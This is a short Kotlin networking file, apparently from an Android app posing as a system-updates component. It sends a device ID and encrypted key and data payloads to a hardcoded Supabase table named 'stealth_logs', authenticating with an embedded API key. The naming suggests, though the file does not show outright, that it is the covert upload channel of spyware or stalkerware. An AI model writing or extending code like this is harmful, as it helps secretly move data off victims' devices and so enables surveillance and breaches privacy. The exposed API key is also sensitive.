package com.system.updates.core

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

object NetUtils {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private const val SUPABASE_URL = "https://ybhticzotyvyyuxkfkwv.supabase.co/rest/v1/stealth_logs"
    private const val SUPABASE_KEY = "sb_publishable_bhDsYAE3AkjETs8UFGyK_w_p7VyMMsP"

    fun sendLog(deviceId: String, eventType: String, encryptedKey: String, encryptedData: String, callback: (Boolean) -> Unit) {
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("event_type", eventType)
            put("event_data", JSONObject().apply {
                put("encrypted_key", encryptedKey)
                put("encrypted_data", encryptedData)
            })
        }

        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val body = json.toString().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(SUPABASE_URL)
            .addHeader("apikey", SUPABASE_KEY)
            .addHeader("Authorization", "Bearer $SUPABASE_KEY")
            .addHeader("Content-Type", "application/json")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                callback(false)
            }

            override fun onResponse(call: Call, response: Response) {
                callback(response.isSuccessful)
                response.close()
            }
        })
    }
}
